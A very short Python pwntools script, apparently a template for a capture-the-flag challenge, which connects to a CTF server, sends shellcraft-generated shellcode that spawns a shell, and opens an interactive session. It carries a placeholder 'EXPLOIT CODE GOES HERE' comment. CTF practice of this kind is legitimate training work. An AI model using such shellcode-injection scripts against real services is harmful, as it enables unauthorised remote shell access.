from pwn import *
context(arch = 'i386', os = 'mac')

r = remote('thuctf2021.redbud.info', 10036)
# EXPLOIT CODE GOES HERE
r.send(asm(shellcraft.sh()))
r.interactive()

